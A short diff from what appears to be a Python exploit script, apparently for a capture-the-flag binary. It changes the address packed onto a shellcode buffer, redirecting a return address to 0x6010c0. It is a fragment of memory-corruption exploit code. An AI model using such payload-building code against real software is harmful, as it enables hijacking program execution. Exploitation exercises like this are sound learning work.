@@ -36,7 +36,7 @@ while len(shellcode) < len(before):
 
 print(len(shellcode))
 
-shellcode += p64(0x0000000000400783)
+shellcode += p64(0x6010c0)
 # shellcode += p64(0x00000000004007fc)
 
 print(shellcode)
